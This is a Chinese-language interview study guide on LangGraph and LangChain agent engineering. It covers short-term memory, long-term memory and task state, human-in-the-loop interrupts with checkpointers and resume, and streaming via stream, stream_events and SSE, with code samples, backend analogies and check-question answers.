| 后端类比 | HttpSession | 用户画像表 | 工作流流程变量 |

关键区别：
- **跟 messages 区别**：messages 是对话历史（给模型看的自然语言），任务状态是结构化业务字段（给流程/代码看的，控制下一步走哪）。两者都在 State 里，但用途不同。
- **跟长期记忆区别**：任务状态是这次任务的，任务结束就清；长期记忆跨会话一直存。

#### 万物云现实

万物云客服 State 里的任务状态：分类结果（intent）、风控结果（risk_level）、当前执行步骤（current_step）、查到的订单信息（order_info）。这些驱动定制拓扑的流转（第5步：分类->风控->计划->执行->综合），每一步读上一步的任务状态决定下一步。

#### 第19步检查题

1. 任务状态跟短期记忆、长期记忆各有什么区别？后端类比是什么？
2. 任务状态存在哪？跟 messages（给模型看的）有什么不同？

答出来再走第20步。

#### 第19步检查题答案（复盘）

> 用户让我直接答，要求口语复述版（面试能照着讲）。

1. **三种记忆区别 + 后端类比**（口语版）：用"给谁看 + 作用域"两个维度分。短期记忆 = 这次会话的对话历史(messages)，给模型看，后端类比 HttpSession，scope 这次会话，checkpointer 可跨天恢复但换会话不带。长期记忆 = 跨所有会话的用户画像，给模型看(主动检索注入)，存 Store(万物云 pgvector)，后端类比用户画像表/Redis，跨会话一直存。任务状态 = 这次任务的中间变量/进度(intent/risk_level/current_step)，存 State 自定义字段，**给流程和代码看**(控制流转)，后端类比工作流流程变量(Activiti execution.setVariable)，任务结束清。一句话：短期=这次会话对话给模型看，长期=跨会话画像给模型看，任务状态=这次任务进度给流程看。

2. **任务状态存哪 + 跟 messages 区别**（口语版）：存 LangGraph State 的自定义字段(TypedDict 里除 messages 外加 intent/risk_level 等业务字段，reducer 管更新)。跟 messages 三点区别：① 给谁看--messages 给模型看(自然语言)，任务状态给流程/代码看(控制流转，如 `if state['risk_level']=='高'` 路由人工审核)；② 结构--messages 是消息列表(System/Human/AI/Tool)，任务状态是平铺键值对(字符串/数字/dict)；③ 用途--messages 驱动模型回答，任务状态驱动流程流转(下一步走哪、要不要 interrupt)。两者都在 State 里但各司其职。万物云例子：分类写 intent、风控写 risk_level、条件边读 risk_level 决定路由、执行读 order_info 算 refund_amount，流程靠任务状态驱动，messages 一直给模型看，两条线并行。

---

### 第20步：三种记忆正交，一次执行同时存在

记忆模块收尾。第17-19步讲了三种记忆，这步讲它们的关系：**正交**（互相独立、不替代），一次执行里**同时存在**、各司其职。

#### 正交是什么意思

正交 = 三个独立维度，谁也不包含谁，不能互相替代：
- 短期记忆管"这次会话的对话"
- 长期记忆管"跨会话的用户画像"
- 任务状态管"这次任务的进度"

你没法用短期记忆替代长期记忆（对话历史 ≠ 用户画像），也没法用任务状态替代短期记忆（进度字段 ≠ 对话历史）。三者各管一摊。

#### 一次执行里三者同时存在

一次万物云客服执行，State 里同时有：

```python
class CustomerServiceState(TypedDict):
    messages: Annotated[list, add_messages]   # 短期记忆（对话历史）
    user_id: str
    # 任务状态（自定义字段）
    intent: str
    risk_level: str
    current_step: str
    refund_amount: float
```

加上 **before_model middleware** 每轮从 **Store**（长期记忆）检索用户 VIP 画像注入。所以一次执行里：
- **短期记忆**：messages 在 State 里，给模型看
- **任务状态**：intent/risk_level/step 在 State 里，给流程看
- **长期记忆**：VIP 画像在 Store 里，按需检索注入到 messages

三者同时跑，各干各的活。

#### 后端类比（重点）

一次 agent 执行 = 一次 HTTP 请求处理，同时用到三样：

| Agent 记忆 | 后端类比（一次请求里同时用） |
|---|---|
| 短期记忆 (messages + checkpointer) | HttpSession（这次会话的数据） |
| 长期记忆 (Store 检索注入) | 查用户画像表/Redis（按 userId 查画像） |
| 任务状态 (State 自定义字段) | 工作流流程变量（这次流程的中间状态） |

就像你写 Spring Controller 处理一个请求：从 HttpSession 取会话数据（短期）、查 user 表取用户信息（长期）、读写 Activiti 流程变量（任务状态）——三样同时用，谁也替不了谁。

#### 为什么不能合并成一种

各有各的**生命周期 / 作用域 / 给谁看**，合并了管理混乱：
- 生命周期不同：短期 scope 会话、长期跨会话、任务状态 scope 任务。混一起不知道啥时候清。
- 作用域不同：短期这个 thread、长期跨所有 thread、任务状态这次任务。混一起越界串台。
- 给谁看不同：短期/长期给模型看（自然语言），任务状态给流程看（结构化字段）。混一起格式乱。

所以必须分开存、分开管。

#### 万物云现实

万物云客服一次执行：messages 存对话历史（短期）+ State 存 intent/risk_level/current_step（任务状态）+ Store 存用户 VIP 画像按需注入（长期）。三套存储、三套生命周期、各管各的，一次执行里协同工作。

#### 第20步检查题

1. 三种记忆为什么是"正交"的？一次执行里三者怎么同时存在？
2. 为什么不能把三种合并成一种？（提示：生命周期/作用域/给谁看有什么不同）

答出来再走第21步（HITL 与流式模块）。

#### 第20步检查题答案（复盘）

> 用户让我直接答，口语复述版。

1. **正交 + 同时存在**（口语版）：正交 = 三个独立维度，谁也不包含谁、不能互相替代。短期管这次会话的对话，长期管跨会话的用户画像，任务状态管这次任务的进度，三摊各管各的，没法互相替代。一次执行里三者同时存在：State 里同时有 messages（短期，给模型看）和 intent/risk_level/current_step（任务状态，给流程看），加上 before_model middleware 每轮从 Store 检索 VIP 画像注入（长期，给模型看）。三者同时跑各干各的。

2. **为什么不能合并**（口语版）：生命周期/作用域/给谁看都不一样。生命周期：短期 scope 会话、长期跨所有会话、任务状态 scope 任务，混一起不知道啥时候清。作用域：短期这个 thread、长期跨所有 thread、任务状态这次任务，混一起越界串台（任务进度混进长期记忆，新会话还带就乱了）。给谁看：短期/长期给模型看（自然语言），任务状态给流程看（结构化字段），混一起格式乱。后端类比：一次 HTTP 请求里 HttpSession + 用户画像表 + Activiti 流程变量三样同时用但各自独立。

---

### 第21步：HITL（Human-In-The-Loop）+ interrupt 完整调用流程

> ⚠️ 本步前半段讲浅了，且有个口径问题：官方 HITL 文档主推 `HumanInTheLoopMiddleware`（LangChain 1.0 middleware），不是 `interrupt_before`（LangGraph 底层编译参数）。下面「补充：按官方文档深度重讲」一节以官方文档为准（https://docs.langchain.com/oss/python/langchain/human-in-the-loop，已抓取核对），前面浅讲部分作引子，深度内容看补充节。

记忆模块（第17-20步）讲完，进入 **HITL 与流式模块**（第21-23步）。这步讲 HITL。

#### HITL 是什么

HITL = Human-In-The-Loop，**人工介入**。Agent 跑到关键点暂停，等人工决策（批准/拒绝/修改），人工确认后才继续。用于**高风险、不可逆**操作--模型不能自作主张。

#### interrupt 机制回顾（LangGraph 文档讲过内部，这里讲 Agent 工程角度）

LangGraph 的 interrupt：在指定节点前/后暂停，把当前 state 存 checkpointer，返回给调用方等人工输入，人工输入后用同 thread_id resume 恢复继续。内部结构（thread_id + checkpoint 版本 + 暂存 state）LangGraph 文档讲过，不重复。这里讲完整调用流程。

#### 完整调用流程（重点）

```
1. invoke 初始调用
   agent 开始跑，执行到 interrupt 节点（如"退款执行"前）
       ↓
2. 框架检测 interrupt，暂停
   把当前 state（messages + 任务状态）存 checkpointer
   返回调用方（带中断信息：在哪个节点暂停、要人工确认什么）
       ↓
3. 调用方/前端展示给人工
   "用户申请退款 100 元，是否批准？"
       ↓
4. 人工决策：批准 / 拒绝 / 修改金额
       ↓
5. 调用方 resume
   用同一个 thread_id + 人工结果（如 {"approved": true}）调 resume
       ↓
6. 框架从 checkpointer 恢复 state，注入人工结果，继续跑
   执行退款 / 拒绝退款
       ↓
7. 结束，返回最终结果
```

关键：第 2 步暂停时 state 存 checkpointer（不会丢），第 6 步 resume 时从 checkpointer 拉回 state 继续--跟第17步"跨运行恢复"是同一套机制，只是这里"暂停"是主动的、等人决策。

#### interrupt_before vs interrupt_after

- `interrupt_before`：节点**执行前**暂停（节点还没跑）--用于"**执行前确认**"
- `interrupt_after`：节点**执行后**暂停（节点跑完了）--用于"**执行后审核**"

#### 后端类比（重点）

HITL = **工作流的人工审批节点**（Activiti userTask / Camunda 用户任务）：
- Activiti 流程跑到 userTask 暂停，等人审批，审批后继续
- `interrupt_before` = userTask 前暂停等审批
- checkpointer 存 state = Activiti 流程实例持久化（流程暂停时存 DB，重启不丢）

#### 万物云现实

万物云高风险操作（退款、改价、改用户权限）用 `interrupt_before` 暂停等人工确认：
- agent 跑到"退款执行"节点前，`interrupt_before` 暂停
- state 存 checkpointer（源文档 08 说用 PostgresSaver，**按真实讲**，别被表结构追问翻车）
- 前端弹"是否批准退款 100 元"
- 人工确认后 resume，执行退款

**为什么用 interrupt 不让模型直接调工具**：高风险不可逆操作必须人工把关，模型不能自作主张。退款错了追不回，所以执行前必须暂停等人确认。

#### 补充：按官方文档深度重讲（checkpointer + 前后端交互 + 口径修正）

> 本节按官方文档 https://docs.langchain.com/oss/python/langchain/human-in-the-loop 重讲（已抓取核对）。前面浅讲部分作引子，深度内容以本节为准。

##### checkpointer 是啥、哪里配置、存哪里

"存 checkpointer" 不是往里存东西的动作，而是：HITL 暂停时要保存"对话进行到哪了"的 graph state，靠 checkpointer（LangGraph 持久化层）。官方原话："The graph state is saved using LangGraph's persistence layer, so execution can pause safely and resume later."

**哪里配置**：创建 agent 时传，不是运行时：

```python
from langgraph.checkpoint.memory import InMemorySaver
agent = create_agent(
    model=..., tools=..., middleware=[HumanInTheLoopMiddleware(...)],
    checkpointer=InMemorySaver(),   # 这里配置
)
```

官方原话："You must configure a checkpointer to persist the graph state across interrupts."（必须配，不配没法暂停恢复）

**存哪里**：看后端实现
- `InMemorySaver`：进程内存，开发用，重启就没
- `AsyncPostgresSaver`：Postgres，生产用（官方："In production, use a persistent checkpointer like AsyncPostgresSaver"）

##### checkpointer vs Store（别混，两套东西）

| | checkpointer | Store |
|---|---|---|
| 存什么 | graph state 快照（messages + 自定义 State 字段） | 跨会话长期记忆（用户画像） |
| 谁管 | 框架自动存（每个 super-step 存一次） | 你主动 put/get |
| 绑什么 | 绑 thread_id（这次会话） | 不绑 thread，按 namespace+key |
| 作用 | 暂停/恢复、time-travel、短期记忆持久化 | 长期记忆，跨所有会话 |
| 后端 | InMemorySaver / AsyncPostgresSaver | InMemoryStore / pgvector 等 |
| 后端类比 | HttpSession 持久化到 Redis | 用户画像表 |

两者都能用 Postgres 做后端，但表不同、用途不同、管理方不同。HITL 用 checkpointer（存"对话进行到哪"），不用 Store（存"用户长期画像"）。

##### 前后端交互（两次 HTTP 往返，不是一次挂着）

官方给的是 Python API，翻译成前后端 HTTP 交互。**核心：两次 HTTP 往返，不是一次连接挂着。**

**第 1 次往返（发起 + 暂停）**：

```
前端: POST /chat { message: "删掉旧记录", thread_id: "abc123" }
        |
        v
后端: result = agent.invoke(
        {"messages":[{"role":"user","content":"删掉旧记录"}]},
        config={"configurable":{"thread_id":"abc123"}},   # thread_id 会话钥匙
        version="v2"
      )
        |
        v  agent 跑：模型提议调 execute_sql("DELETE FROM records...")
        v  HumanInTheLoopMiddleware 的 after_model 钩子检测到需审核
        v  调 interrupt 暂停 -> graph state 存 checkpointer（key=thread_id）
        v  invoke 返回，result.interrupts 带暂停信息：
        Interrupt(value={
          'action_requests': [{            # agent 想干啥
            'name': 'execute_sql',
            'arguments': {'query': 'DELETE FROM records WHERE...'},
            'description': 'Tool execution pending approval ...'
          }],
          'review_configs': [{             # 允许哪些决策
            'action_name': 'execute_sql',
            'allowed_decisions': ['approve', 'reject']
          }]
        })
        |
        v
后端把 result.interrupts 序列化成 HTTP 响应返回前端:
      { "status":"paused", "thread_id":"abc123",
        "action_requests":[{"name":"execute_sql","arguments":{...}}],
        "allowed_decisions":["approve","reject"] }
```

**关键**：第一个 invoke 返回了，HTTP 连接不挂着。前端拿到"需人工审核"响应。人工可以想 5 分钟，连接早断了。

**前端展示**：`Agent 想执行 execute_sql: DELETE FROM records WHERE...` + 按 allowed_decisions 渲染按钮 [批准][拒绝]

**第 2 次往返（resume）**：

```
前端: 人工点"批准"
      POST /resume { thread_id:"abc123", decisions:[{"type":"approve"}] }
        |
        v
后端: agent.invoke(
        Command(resume={"decisions":[{"type":"approve"}]}),   # 人工决策
        config={"configurable":{"thread_id":"abc123"}},        # 同一个 thread_id!
        version="v2"
      )
        |
        v  框架用 thread_id 从 checkpointer 拉回暂停时的 graph state
        v  注入决策 -> 执行 execute_sql -> 继续跑 -> 完成
        |
后端返回最终结果给前端
```

**为什么两次请求能接上**：第一次暂停时 state 存 checkpointer，key 是 thread_id；第二次 resume 用同一个 thread_id 拉回。thread_id = JSESSIONID，跨 HTTP 请求找会话状态。

##### 四种决策（官方定的）

| 决策 | 干啥 | 用例 |
|---|---|---|
| `approve` | 原样执行工具 | 邮件草稿直接发 |
| `edit` | 改参数再执行 | 改收件人再发 |
| `reject` | 不执行，返回拒绝反馈给 agent | 拒绝删文件并说明原因 |
| `respond` | 人工直接回复当工具结果（工具不执行） | ask_user 工具，人工答"蓝色" |

前端按 allowed_decisions 渲染按钮。reject 带 message 反馈给模型；respond 把人工回复当成功 ToolMessage 喂回模型（用于"问用户"类工具）。

##### 执行生命周期（after_model 钩子）

HumanInTheLoopMiddleware 定义 after_model 钩子，在模型生成响应后、工具执行前跑（第 6-9 步的 after_model 位置）：
1. agent 调模型生成响应
2. middleware 检查响应里有没有 tool_calls
3. 有需审核的 -> 构建 HITLRequest（action_requests + review_configs）-> 调 interrupt
4. agent 等人工决策
5. 按决策：批准/编辑的执行，拒绝的合成 ToolMessage，respond 的把人工回复当 ToolMessage -> 恢复执行

##### 口径修正：三种 HITL 机制

| 机制 | 层级 | 怎么用 |
|---|---|---|
| `HumanInTheLoopMiddleware` + `interrupt_on` | LangChain 1.0 middleware（官方主推） | 按工具调用拦截，after_model 钩子，四种决策，配置驱动 |
| `interrupt_before` / `interrupt_after` | LangGraph 编译参数（较底层） | compile(interrupt_before=["refund_node"])，节点级暂停 |
| `interrupt()` 函数 | 最底层原语 | 节点代码里主动调，完全自定义 |

万物云用 interrupt_before（节点级，手动 StateGraph 按节点控制更自然，源文档 08 口径）。**但面试要知道官方现在主推 middleware 这套**（按工具调用、四种决策），别只说 interrupt_before 显得老。

##### 生产坑

- checkpointer 用 InMemorySaver，**多实例部署就拉不回**（请求打到不同实例）-> 生产必须 AsyncPostgresSaver，state 共享存 Postgres
- thread_id 要前端生成或网关分配并回传，不能后端每次随机 -> 否则第二次 resume 找不回（=JSESSIONID 要 cookie 带回来）
- reject 的 message 要写清楚"别再试这个工具"，否则模型可能换参数重试（官方警告）
- edit 改参数要保守，大改会让模型重新评估思路、可能多次执行工具（官方警告）

##### 补充：checkpointer 什么时候存 / 第二天能 resume 吗（接第17步 ChatGPT 机制）

**checkpointer 不是只在 interrupt 时存** -- 整个 run 期间每跑完一个节点（super-step）就存一次。interrupt 只是"停在这别往下跑"，此时最新 checkpoint 已存好（上一节点跑完就存了）。比喻：游戏每过一关自动存档，interrupt = 暂停游戏，存档早就在了，不是按暂停才存。resume = 读档继续。agent 跑了 5 个节点再 interrupt，checkpointer 里已有 5 个 checkpoint，resume 从最新的拉。

**HTTP 连接断了不影响**：state 不在连接里、不在进程内存里，在 checkpointer 后端（外部存储）。第一个 invoke 返回后连接关闭，state 还在 checkpointer 里，key=thread_id。

**第二天 resume 看后端**：
- `AsyncPostgresSaver`（Postgres）：第二天、第二周都能 resume，只要那行还在（默认不自动删，除非加 TTL/手动清）
- `InMemorySaver`（进程内存）：进程重启就丢

**= 第 17 步 ChatGPT 第二天继续是同一套机制**：checkpointer 持久化 + 同 thread_id 恢复。HITL 的"暂停等人决策"只是"恢复"的特例--普通对话是"用户第二天发新消息触发恢复"，HITL 是"人工第二天点批准触发恢复"，机制完全一样，都是 thread_id 从 checkpointer 拉回 state。

后端类比：Activiti 流程跑到 userTask 暂停存 DB，触发流程的 HTTP 早返回，审批人第二天/下周 complete task 都行，流程引擎按 processInstanceId 从 DB 拉回继续，只要 DB 里那行还在。

#### 第21步检查题

1. HITL 的完整调用流程（invoke -> 暂停 -> resume）是什么？后端类比？
2. `interrupt_before` 和 `interrupt_after` 区别？万物云高风险操作用哪个、为什么？

#### 第21步检查题答案（复盘）

> Q1 用户原答："HITL感觉就是触发langgraph的interrupt，然后前端确认后就恢复，恢复命令是啥，是Command到end还是node还是goto这部分感觉有点混了没说清楚。"
> Q2 用户原答："有啥区别"（未答，让 AI 讲）

**Q1 标准答案**：用户对了一半（HITL=触发interrupt+前端确认+恢复），但把三种 Command 用途混了。官方 graph-api 原话："Command(resume=...) is the only Command pattern intended as input to invoke(). The other Command parameters (update, goto) are designed for returning from node functions."

三种 Command 完全不同：
- `Command(resume=...)`：调用方传给 invoke() 当输入，HITL 恢复用。**唯一**能作 invoke 输入的 Command。
- `Command(goto="node")`：节点函数 return 它，路由用（告诉图下个跑哪个节点）。
- `Command(update={...})`：节点函数 return 它，更新 state 用（可跟 goto 组合）。

resume 不"去"END 也不"goto"任何节点--它恢复暂停的节点，节点从头重跑，interrupt() 这次返回人工传的 resume 值（interrupts 文档原话："The node restarts from the beginning of the node where the interrupt was called when resumed, so any code before the interrupt runs again"）。坑：interrupt() 前的代码会再跑一遍，别放副作用代码或做幂等。

**Q2 标准答案**：interrupt_before=节点执行前暂停（执行前确认），interrupt_after=节点执行后暂停（执行后审核），都是 compile 时配的**静态断点**。

**口径修正（重要）**：interrupts 文档原话 "Static interrupts are not recommended for human-in-the-loop workflows. Use the interrupt [function]..."。= interrupt_before/after 是静态断点，**官方明确说不推荐用于 HITL**（定位是调试/单步）。HITL 官方推荐用 interrupt() 函数（动态，节点里调，可条件触发）或 HumanInTheLoopMiddleware。源文档 08 说万物云用 interrupt_before 做 HITL，面试时按真实讲（实际用 interrupt()/middleware 就别说成 interrupt_before），并知道官方推荐。

interrupt() vs interrupt_before 核心区别（官方原话）："Unlike static breakpoints (which pause before or after specific nodes), interrupts are dynamic: they can be placed anywhere in your code and can be conditional." = 动态 vs 静态。

#### 第21步补充：C 端生产多实例落地问题（→ 独立文档）

> 用户提问：C 端生产必然多实例，checkpointer 多实例拉不回怎么办？= Redis 分布式锁/分布式 session 问题。多会话同时进来、多实例多线程怎么处理？

这步引出一个**生产级大问题**：Agent 有状态 + C 端多实例 = 分布式系统经典问题。已抓取 LangGraph 官方文档（persistence / checkpointers / fault-tolerance / HITL 四页）核对，**新开独立文档展开**：

📄 **《Agent工程生产落地问题说明.md》**（同目录）

覆盖 10 个问题：①状态共享(=分布式session,PostgresSaver共享) ②并发写同会话(=Redis分布式锁,thread级串行化) ③多会话并发(async/worker/连接池/GIL) ④实例被杀(graceful shutdown,SIGTERM+request_drain) ⑤节点失败(RetryPolicy+pending writes+resume-safe) ⑥超时(run/idle/heartbeat) ⑦幂等(工具幂等键) ⑧状态膨胀(cron清+GDPR) ⑨长任务(异步作业+SSE) ⑩可观测(trace_id跨实例)。

**面试要点**：万物云自托管(手动 StateGraph)，状态共享用 Postgres、并发保护自己加 Redis 锁(**不说框架白送**)、K8s 滚动更新接 SIGTERM drain、退款工具带幂等键。诚实边界：哪些官方核对过、哪些待核、万物云按真实讲，文档末尾有核实说明。

答出来再走第22步。

---

### 第22步：Streaming 三种方式（invoke / stream / stream_events）

第 21 步讲完 HITL，这步讲流式输出。生产上 LLM 调用慢（几秒到几十秒），用 invoke 前端干等体验差，必须流式边生成边显示--ChatGPT 的"打字效果"就是这么来的。

#### 三种方式对比（官方 streaming 文档核对）

| 方式 | 返回 | 粒度 | 何时用 |
|---|---|---|---|
| `invoke(input, config)` | 最终结果（阻塞等完） | 无中间 | 简单场景/后台任务，前端不等 |
| `stream(input, stream_mode=, version="v2")` | 吐 StreamPart chunk | 按 stream_mode（节点级/token级） | 要中间进度，按 mode 分支消费 |
| `stream_events(input, version="v3")` | typed projections（独立迭代器） | 细粒度事件 | **官方推荐新应用**，HITL 也用它 |

官方原话："For new applications, we recommend event streaming-the typed-projection API introduced in LangGraph v1.2. Event streaming gives you separate iterators per projection (messages, values, subgraphs, output) so you can consume them independently instead of branching on stream_mode chunks."

#### 1. invoke：阻塞，一次性

```python
result = agent.invoke(
    {"messages":[{"role":"user","content":"查订单 ORD-001"}]},
    config={"configurable":{"thread_id":"abc123"}},
    version="v2"
)
# 阻塞等 agent 跑完, result 是最终结果, 前端干等
```
= 同步 HTTP 请求，等响应。简单但前端转圈圈。version="v2" 时 result 是 GraphOutput（HITL 时带 .interrupts，第 21 步讲过）。

#### 2. stream：按 stream_mode 吐 chunk

```python
for chunk in agent.stream(
    {"messages":[...]},
    config={"configurable":{"thread_id":"abc123"}},
    stream_mode="updates",   # 或 "values"/"messages"/"custom"/列表
    version="v2"
):
    # v2: 每个 chunk = {"type":..., "ns":..., "data":...}
    print(chunk["type"], chunk["data"])
```

stream_mode 选项（最重要的几个）：
- `values`：每个 superstep 后的**完整 state 快照**。= 每步的"当前全貌"（重发全 state）
- `updates`：每个节点的**输出增量**（不重发全 state）。= 每步"变了啥"
- `messages`：**LLM token 级**（逐 token）。= 打字效果
- `custom`：节点用 `get_stream_writer` 主动发自定义事件。= 业务自定义进度（如"正在查订单..."）
- 还有 `checkpoints` / `tasks` / `debug`

可传列表同时拿多个：`stream_mode=["updates", "custom"]`。消费时按 chunk["type"] 分支（v2 统一了格式，v1 格式随 mode 变）。

#### 3. stream_events：typed projections（官方推荐）

```python
stream = agent.stream_events(
    {"messages":[...]},
    config={"configurable":{"thread_id":"abc123"}},
    version="v3"
)
# 独立迭代器, 不用分支判断
for message in stream.messages:        # token 级
    for token in message.text:
        print(token, end="", flush=True)

if stream.interrupted:                  # HITL 暂停检测
    print(stream.interrupts)

for snap in stream.values:              # state 快照
    ...
```

stream_events 的 projections：
- `stream.messages`：LLM token 级（打字效果）
- `stream.values`：state 快照
- `stream.subgraphs`：子图事件
- `stream.output`：最终输出
- `stream.interrupted` / `stream.interrupts`：HITL 暂停（第 21 步讲过，HITL 流式版用它）

**为什么推荐 stream_events**：messages/values 等是**独立迭代器**，各消费各的，不用像 stream 那样按 type 分支。代码更清晰。

#### 关键概念：两个层次（之前讲混了，纠正）

`stream` / `stream_events` 只是**后端 Python 进程内的迭代器 API**，不是传输协议。打字机效果是**两层配合**：

| 层次 | 干什么 | 技术 |
|---|---|---|
| 层次 A：后端产 chunk | agent 把数据一块块吐出来 | LangGraph 的 invoke / stream / stream_events |
| 层次 B：传输到前端 | chunk 通过网络推给前端 | SSE / WebSocket / HTTP chunked |

之前只讲了层次 A，没讲层次 B，所以"数据怎么到前端"缺了一块。（官方 streaming 文档只讲层次 A 的 API，层次 B 的 SSE/WebSocket 是通用 web 知识，部署层的事，文档不管）

#### stream vs stream_events 区别（Spring 类比）

两者都是层次 A，区别在**怎么消费 chunk**：

- `stream` = 一个迭代器，所有 chunk 混在一起，每个 `{"type":..., "data":...}`，消费端 `if chunk["type"]=="messages"` 分支判断
  - 类比 Spring `Flux<Object>` 混发，消费端 `.ofType(A.class)` 过滤
- `stream_events` = 多个独立迭代器，按类型分好（`stream.messages` / `stream.values` / `stream.interrupted`），各消费各的
  - 类比已 `groupBy` 分好的多个 `Flux<A>` / `Flux<B>`，各订阅各的

官方推荐 stream_events：不用分支判断，代码更清晰。

#### 层次 B：前后端流式传输三种方式

| 方式 | 方向 | 协议 | 前端 API | 适用 |
|---|---|---|---|---|
| SSE（Server-Sent Events） | 单向（服务器到前端） | HTTP，`text/event-stream` | `EventSource` | **LLM 最常用**（ChatGPT 用的就是 SSE） |
| WebSocket | 双向 | `ws://` | `WebSocket` | 需要前端中途发消息（语音对话、协作） |
| HTTP chunked | 单向 | `Transfer-Encoding: chunked` | `fetch` + `ReadableStream` | 简单场景，无自动重连 |

**为什么 LLM 用 SSE 不用 WebSocket**：
- LLM 流式是单向（服务器推 token），不需要双向，WebSocket 过重
- SSE 基于 HTTP，穿透防火墙/代理好，部署简单（不用单独升级 ws 连接、不用单独处理心跳）
- SSE 自动重连，断线恢复好做
- WebSocket 适合语音对话那种前端也要实时往回推音频的场景

#### 打字机效果完整链路（层次 A + B 串起来）

后端（FastAPI + SSE）：
```python
from fastapi import FastAPI
from fastapi.responses import StreamingResponse

app = FastAPI()

@app.get("/chat")
def chat():
    def event_stream():
        stream = agent.stream_events(
            {"messages":[{"role":"user","content":"你好"}]},
            config={"configurable":{"thread_id":"abc123"}},
            version="v3"
        )
        for message in stream.messages:        # 层次A: 后端迭代器拿 token
            for token in message.text:
                yield f"data: {token}\n\n"     # 层次B: SSE 格式
    return StreamingResponse(event_stream(), media_type="text/event-stream")
```

前端（EventSource）：
```javascript
const es = new EventSource("/chat");           // 层次B: SSE 接收
es.onmessage = (e) => {
    document.getElementById("output").textContent += e.data;  // 逐 token append = 打字机
};
```

链路：后端 `stream.messages` 逐 token 产（层次 A）-> 包成 SSE `data: token\n\n` yield（层次 B）-> FastAPI `StreamingResponse` 推前端 -> 前端 `EventSource.onmessage` append DOM -> 打字机效果。

**结论**：stream 没有别的作用，就是后端产 chunk；打字机 = stream（产 chunk）+ SSE（传 chunk）配合，缺一不可。第 23 步讲 SSE 细节（断线重连、HITL 流式中断、多实例会话亲和、生产坑）。

#### 后端类比

- `invoke` = 同步 HTTP 请求，等响应（前端转圈圈干等）
- `stream` = SSE/分块传输，服务器吐一块前端显示一块，但要按类型分支处理
- `stream_events` = 多通道事件流，不同类型走不同通道独立消费

ChatGPT 的"打字效果" = `messages` mode / `stream.messages`（token 级流式）。

#### 生产坑

- LLM 慢，**必须流式**（stream/stream_events），用 invoke 前端干等几十秒体验崩
- 流式要配 async（`astream` / `astream_events`），同步 stream 阻塞线程，并发上不去（生产文档问题 3 讲过）
- version 参数别搞错：invoke/stream 用 "v2"，stream_events 用 "v3"
- stream_events 要求 LangGraph >= 1.2（typed-projection API）
- 流式 chunk 通过 SSE 推前端 = 第 23 步要讲的全链路

#### 万物云现实

万物云客服前端用流式（用户看到"打字效果"），后端用 stream_events（官方推荐）或 stream（stream_mode="messages" + "updates"）。具体按真实讲。

#### 第22步检查题

1. invoke / stream / stream_events 三种方式区别？生产为什么必须用流式？
2. stream_mode 的 values / updates / messages 各是什么粒度？ChatGPT 打字效果用哪个？
3. stream_events 相比 stream 好在哪（官方为什么推荐）？
4. stream / stream_events 是传输协议吗？打字机效果靠什么传到前端？SSE vs WebSocket 区别，为什么 LLM 用 SSE？

答出来再走第23步（SSE 全链路）。

#### 第22步检查题答案（复盘）

**第 1 小步**（前端干等为什么不行）：
- 用户原答："所以现在都是算首字 token 的响应时间吧"
- 标准/补充：对，TTFT（Time To First Token，首字响应时间）是流式 LLM 核心体验指标。补：同步等 12 秒前端白屏干等，用户以为卡死，所以要尽快吐首字。

**第 2 小步**（怎么做到首字尽快）：
- 用户原答："流式响应啊"
- 标准/补充：对。Java 里对应 Spring 的 SseEmitter / StreamingResponseBody，或 WebSocket。LLM 用 SSE 最多。

**验证题**（stream_events 是迭代器吗 + invoke 断啥）：
- 用户原答："stream_events 就是将他转成迭代器，for 切成多个 chunk，yield 把 token 逐个返回前端；invoke 全部执行完才返回，断啥了"
- 标准/补充：主干全对。补"断啥了"：invoke 不返回迭代器，阻塞跑完直接返回完整结果，"逐 token 产"这环没了，没东西可 yield，StreamingResponse 没数据推，前端 12 秒收不到字最后一次性收全部 = 打字机断了，退化成干等一次出。一句话：invoke 把"逐块产"这环抽掉了。

**stream vs stream_events 区别（第 3 题）**：
- stream（老）：一个迭代器混着发，每个 {"type":..., "data":...}，消费端 if chunk["type"] 分支。= Java Iterator<Object> + instanceof
- stream_events（新，v1.2+）：按类型分好独立迭代器（stream.messages / stream.values / stream.interrupted），各遍历各的，不用 if。= Java 已分好的 Iterator<A> / Iterator<B>
- 官方推荐 stream_events：不用分支，代码干净。

**stream_mode 三模式粒度（第 2 题）**：
- messages：LLM token 级（逐字），ChatGPT 打字效果用这个
- values：每个节点跑完后的完整 state 快照（重发全 state）
- updates：每个节点的输出增量（只发变的）

**关键认知纠偏**：stream / stream_events 是后端进程内的迭代器 API（层次 A），不是传输协议；传输到前端靠 SSE（层次 B）。打字机 = stream（产 chunk）+ SSE（传 chunk）配合。用户一开始把 stream 当成"打字机的实现"，卡在"数据怎么到前端"，根因是没分清两个层次。

**辅导方式纠正**：用户是资深 Java 后端，基础概念（流式、TTFT）已懂，别从基础引导小步（会嫌慢），要直接用后端类比讲透他卡的细节点。小步 = 一次讲透一个卡点，不是从幼儿园基础开始。

---

### 第23步：SSE 全链路生产细节

第 22 步打通了打字机主干（stream_events 产 chunk + SSE 传 + EventSource 收）。这步讲这条链路在生产上会踩的坑，4 个：

1. 断线重连（EventSource 自动重连 + Last-Event-ID + LangGraph 能不能续）
2. 多实例会话亲和（流式请求得粘同一实例）
3. HITL 流式中断（一边流 token 一边检测暂停，前端弹审核框）
4. 反向代理缓冲（nginx `proxy_buffering off`，否则 SSE 被缓冲不实时）

#### 点 1：断线重连

**SSE 关键特性：自动重连**

EventSource 连接断了，浏览器**自动重连**（默认 3 秒），不用写重试代码。比 WebSocket 省心（WebSocket 断了得自己写重连逻辑）。
- 后端类比：Java 里 HTTP 客户端断了得自己 retry（或挂 Spring Retry）；SSE 这个重连是浏览器免费的，等于浏览器帮你挂了 retry。

**重连续传：Last-Event-ID**

重连时浏览器自动带 `Last-Event-ID` 请求头，值是上次收到的最后一个 event 的 id。后端读这个头，从 id 之后续发，前端不丢数据、不重复。
- 后端类比：断点续传 / 分页带的 `offset` / `cursor`，一个意思。
- 后端配合：发 event 时带 id（`id: 7\n`），并记住 id->数据 映射。

**LangGraph 场景的坑（面试区分点）**

- LangGraph 的 checkpointer 保的是 **graph state（节点边界）**，**不是"token 发到哪"**
- 所以 SSE 断了重连，token 级续传**不是开箱即用**，要自己处理
- 生产常见做法：重连用**同一个 thread_id**，agent 状态从 checkpointer 拉回，继续流后续 token（已发的前端已有，不重发）；生成中突然断了可能丢中间几个 token，一般接受或让用户重发
- 严谨做法：每个 token event 带 id + 后端记映射，按 Last-Event-ID 精确补发，但 token 量太大一般不做

